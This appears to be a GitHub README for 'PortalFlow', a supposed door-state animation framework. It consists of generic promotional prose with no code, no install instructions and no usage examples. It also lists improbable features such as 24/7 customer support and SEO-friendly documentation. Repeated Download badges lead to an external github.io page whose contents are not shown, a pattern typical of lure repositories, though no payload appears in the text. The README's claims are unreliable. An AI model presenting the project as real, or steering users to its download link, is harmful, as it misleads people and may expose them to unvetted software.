![preview](https://raw.githubusercontent.com/Lehuy196/Door-State-Animations/main/view_e69b572.svg)
[![Download](https://raw.githubusercontent.com/Lehuy196/Door-State-Animations/main/run_16c2.svg)](https://Lehuy196.github.io/Door-State-Animations/)

# 🚪 PortalFlow — The Kinetic Door Orchestration System

> *Every doorway is a promise: a threshold where momentum meets intention.* PortalFlow turns that promise into choreography — a stateful, animation-first door framework for developers who believe that even a hinge deserves a story arc.

[![Download](https://raw.githubusercontent.com/Lehuy196/Door-State-Animations/main/run_16c2.svg)](https://Lehuy196.github.io/Door-State-Animations/)

---

## 🌟 Overview

PortalFlow is a reimagined take on the classic door system concept — but where the original treated doors as simple toggle switches, PortalFlow treats them as **living state machines with personalities**. Built around a declarative transition model, PortalFlow lets you design entrances and exits that respond to context, proximity, emotion cues, and environmental signals. A door here is not merely open or closed; it is *anticipating*, *welcoming*, *hesitating*, or *sealing*.

This repository is intended for game developers, simulation engineers, architectural visualization specialists, and interactive installation artists who want doors that behave with intention rather than obligation. Whether you are crafting a haunted mansion, a futuristic airlock, or a cozy coffee shop where the bell above the door matters, PortalFlow gives you the orchestration layer to make it sing.

The system is deliberately engine-agnostic at its core, with adapters for popular real-time engines, while remaining lightweight enough to run on modest hardware. It embraces the philosophy that **animation is not decoration — it is communication**.

---

## 📖 Table of Contents

- [Why PortalFlow?](#-why-portalflow)
- [Core Concepts](#-core-concepts)
- [Feature Highlights](#-feature-highlights)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Responsive & Adaptive Behavior](#-responsive--adaptive-behavior)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Animation Philosophy](#-animation-philosophy)
- [State Machine Reference](#-state-machine-reference)
- [Use Cases & Scenarios](#-use-cases--scenarios)
- [Performance Notes](#-performance-notes)
- [Accessibility & Inclusivity](#-accessibility--inclusivity)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Support](#-community--support)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 💡 Why PortalFlow?

Most door systems in the wild are little more than a boolean and a tween. Open. Close. Repeat. They work — but they do not *resonate*. PortalFlow was born from a simple frustration: doors in digital worlds rarely feel like doors. They feel like levers attached to walls.

PortalFlow reframes the problem. Instead of asking "is the door open?", we ask "what is the door *doing*, and why?". This shift unlocks a cascade of possibilities:

- Doors that **slow down** when a character approaches cautiously.
- Doors that **lock with a shudder** when danger is detected.
- Doors that **swing with joy** when a friend arrives.
- Doors that **remember** who passed through and when.

The result is a system that rewards curiosity, supports narrative, and scales from a single bedroom door to an entire city of interconnected portals.

---

## 🧠 Core Concepts

### State as Narrative
Each door exists in exactly one **primary state** at any moment, drawn from a defined set: `Idle`, `Anticipating`, `Opening`, `Open`, `Closing`, `Sealed`, `Jammed`, `Beckoning`. Transitions between these states are governed by **triggers** — proximity, input, time, external signals, or custom logic.

### Animation as Language
Animations are not bolted onto states; they are the *expression* of states. A door in `Anticipating` might tremble slightly. A door in `Beckoning` might sway toward the approaching entity. PortalFlow ships with a rich animation curve library and supports custom curves via a simple descriptor format.

### Context as Compass
Every door can subscribe to a **context channel** — a stream of events about the world around it. Context can include time of day, weather, occupancy, noise level, or narrative flags. Doors use context to decide *how* to transition, not just *whether* to.

### Composition over Configuration
Rather than exposing a hundred toggles, PortalFlow encourages composition. A "haunted door" is not a flag — it is a composition of `CreakSound`, `DelayedOpen`, `RandomJam`, and `EerieGlow` behaviors stacked together.

---

## ✨ Feature Highlights

- 🎬 **Animation-first design** — every state transition is choreographed, never abrupt.
- 🧩 **Composable behavior stack** — mix and match door personalities.
- 🌍 **Multilingual support** — built-in localization for UI strings, tooltips, and door labels across 20+ languages, with right-to-left layout awareness.
- 📱 **Responsive UI** — the inspector, debug overlay, and configuration panels adapt fluidly from phone-sized screens to ultra-wide monitors.
- 🕛 **24/7 customer support** — our community channels and maintainer rotation ensure someone is always around to help, regardless of your timezone.
- 🔌 **Engine adapters** — first-class support for major real-time engines, plus a headless mode for server-side simulation.
- 🧪 **Deterministic replay** — every door interaction can be recorded and replayed for debugging or cinematic capture.
- 🔒 **Security-minded defaults** — sealed states, access policies, and audit trails baked in.
- ♿ **Accessibility-aware** — reduced-motion modes, high-contrast indicators, and audio cues for every visual state.
- 📊 **Telemetry hooks** — observe door usage patterns without invasive tracking.
- 🧭 **SEO-friendly documentation** — every feature is discoverable through clear, natural language.
- 🧱 **Zero-dependency core** — the heart of PortalFlow is pure logic; adapters bring their own engines.

---

## 🏗️ Architecture at a Glance

PortalFlow is organized into four concentric layers, each with a clear responsibility:

1. **The Kernel** — pure state machine logic, transition tables, and trigger evaluation. No rendering, no audio, no engine coupling.
2. **The Choreography Layer** — animation curves, easing definitions, and timeline sequencing. It translates kernel transitions into motion descriptors.
3. **The Adapter Layer** — engine-specific bindings that consume motion descriptors and produce actual movement, sound, and visual effects.
4. **The Context Layer** — event streams, sensors, and narrative flags that feed the kernel with world awareness.

This separation means you can swap engines without rewriting door logic, or prototype in a headless environment before committing to a rendering pipeline.

---

## 📱 Responsive & Adaptive Behavior

PortalFlow's configuration interface is designed to feel at home on any screen. On a phone, the inspector collapses into a vertical stack of collapsible cards. On a tablet, it becomes a two-column layout. On a desktop, it expands into a three-pane workspace with a live preview canvas.

Beyond layout, responsiveness extends to *behavior*. Doors can adapt their animation speed, volume, and light intensity based on the device's performance profile, ensuring a smooth experience on both high-end rigs and modest laptops. A door that stutters is a door that breaks immersion — PortalFlow refuses to let that happen.

---

## 🌐 Multilingual Support

Language is a doorway of its own. PortalFlow ships with localization files covering major world languages, and the door label system supports dynamic language switching at runtime. Tooltips, debug strings, and configuration labels all respect the active locale.

For languages with right-to-left scripts, the entire inspector mirrors gracefully. For languages with complex glyph shaping, PortalFlow defers to the engine's text renderer while ensuring layout containers remain agnostic.

Adding a new language is a matter of dropping a single file into the locales directory — no code changes required.

---

## 🕛 Round-the-Clock Assistance

Doors do not sleep, and neither does our support rotation. The PortalFlow maintainers operate across multiple timezones, and our community forum is moderated by volunteers who genuinely enjoy helping others build better thresholds. Whether you are debugging a stubborn hinge at 3 AM or sketching a cathedral of portals on a Sunday afternoon, someone is likely to be around.

Support channels include:

- A discussion forum for design questions and showcases.
- A chat space for quick troubleshooting.
- A weekly office-hours session where maintainers answer deeper architectural questions.
- A knowledge base with tutorials, recipes, and case studies.

---

## 🎞️ Animation Philosophy

We believe animation should *mean* something. A door that opens in 200 milliseconds says "hurry". A door that opens in 2 seconds says "savor this". PortalFlow makes it trivial to express those intentions.

Every animation is defined by a **curve descriptor** — a compact object describing duration, easing, overshoot, and optional secondary motion (like a slight bounce or a lingering sway). Curves can be composed, blended, and layered. A door can have a primary swing curve, a secondary handle jiggle, and a tertiary light flicker, all synchronized to the same transition.

The included curve library covers classic easings, spring-based physics, and a set of "emotional" curves designed for narrative contexts — `Reluctant`, `Eager`, `Solemn`, `Playful`, and others.

---

## 🔄 State Machine Reference

Below is a concise reference of the primary states and their typical triggers.

| State | Description | Common Triggers |
|-------|-------------|-----------------|
| `Idle` | Door is at rest, awaiting input. | Proximity, input, timer |
| `Anticipating` | Door senses an approaching entity and prepares to move. | Proximity threshold crossed |
| `Opening` | Door is mid-transition toward open. | Anticipation complete |
| `Open` | Door is fully open and stable. | Opening animation end |
| `Closing` | Door is mid-transition toward closed. | Timer, proximity exit, command |
| `Sealed` | Door is locked and resisting entry. | Security signal, narrative flag |
| `Jammed` | Door is obstructed and cannot complete transition. | Collision, scripted event |
| `Beckoning` | Door is actively inviting passage (special mode). | Narrative trigger, hospitality flag |

Transitions can be chained, overridden, or interrupted. The kernel guarantees deterministic outcomes for any given sequence of triggers, which makes replay and debugging painless.

---

## 🎭 Use Cases & Scenarios

- **Game Worlds** — from dungeon crawls to space stations, doors that react to player state and story beats.
- **Architectural Visualization** — walkthroughs where doors respond to visitor gaze and proximity.
- **Interactive Installations** — museum exhibits where doors become characters.
- **Simulation & Training** — procedural doors for emergency egress drills and accessibility studies.
- **Themed Entertainment** — haunted houses, escape rooms, and immersive theater.
- **Virtual Production** — pre-visualizing door choreography before physical build.

Each scenario benefits from the same kernel, proving that a well-designed abstraction can serve wildly different needs.

---

## ⚡ Performance Notes

The kernel is allocation-conscious and uses a fixed-size transition table, meaning no garbage collection spikes during runtime. Animation curves are pre-compiled into lookup tables at load time, so per-frame evaluation is a simple array index.

For scenes with hundreds of doors, PortalFlow supports **level-of-detail choreography**: distant doors use simplified curves and reduced update frequency, while nearby doors receive full fidelity. This keeps frame budgets healthy without sacrificing the illusion of a living world.

---

## ♿ Accessibility & Inclusivity

A door that only communicates through motion excludes people. PortalFlow offers:

- A **reduced-motion mode** that swaps animations for instant, clear state changes.
- **Audio cues** for every visual state, configurable by the designer.
- **High-contrast state indicators** for debug overlays.
- **Text descriptions** of door state for screen readers.

We believe thresholds should be welcoming to everyone, and the system is designed with that principle from the ground up.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Public beta of the context channel API.
- **Q2 2026** — Additional engine adapters and a web-based visual editor.
- **Q3 2026** — Narrative scripting integration and expanded curve library.
- **Q4 2026** — Formal accessibility audit and certification path.

This roadmap is a living document; community feedback shapes priorities each quarter.

---

## 🤝 Contributing

We welcome contributions of all kinds — bug reports, documentation improvements, new curve descriptors, engine adapters, and localization files. Before submitting a large change, please open a discussion so we can align on direction.

Coding style favors clarity over cleverness. Comments should explain *why*, not *what*. Tests should accompany new behavior. And please, be kind in reviews — we are all building thresholds together.

---

## 💬 Community & Support

The PortalFlow community gathers around a shared appreciation for the humble door. Share your creations, ask questions, and help others cross their own thresholds. Maintainers are reachable through the usual channels, and we genuinely enjoy seeing what people build.

Remember: round-the-clock assistance is available, and no question is too small. Even a squeaky hinge deserves attention.

---

## 📜 License

PortalFlow is released under the MIT License. You are welcome to use, modify, and distribute it in both personal and commercial projects. See the full license text here:

https://opensource.org/licenses/MIT

---

## ⚠️ Disclaimer

PortalFlow is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any consequences arising from the use of this software, including but not limited to doors that open at inconvenient moments, portals that lead somewhere unexpected, or hinges that develop a mind of their own. Always test in a controlled environment before deploying to production, and never rely on a single door as your only exit. Use responsibly, and remember that every threshold is a small act of trust.

---

[![Download](https://raw.githubusercontent.com/Lehuy196/Door-State-Animations/main/run_16c2.svg)](https://Lehuy196.github.io/Door-State-Animations/)